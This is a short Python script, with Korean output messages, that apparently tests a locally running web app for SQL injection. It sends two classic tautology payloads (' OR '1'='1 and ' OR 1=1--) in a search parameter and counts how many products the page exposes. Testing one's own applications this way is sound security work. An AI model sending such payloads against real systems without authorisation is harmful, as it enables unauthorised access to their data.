import requests

target_url = "http://localhost:5000/"

payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
]

print("SQL Injection 데이터 추출 테스트\n")

for i, payload in enumerate(payloads, 1):
    print(f"테스트 {i}: {payload}")
    
    response = requests.get(target_url, params={"search": payload})
    
    if response.status_code == 200:
        product_count = response.text.count('product-card')
        print(f"  상태: 200 - {product_count}개 상품 노출")
    else:
        print(f"  상태: {response.status_code} - 실패")
    print()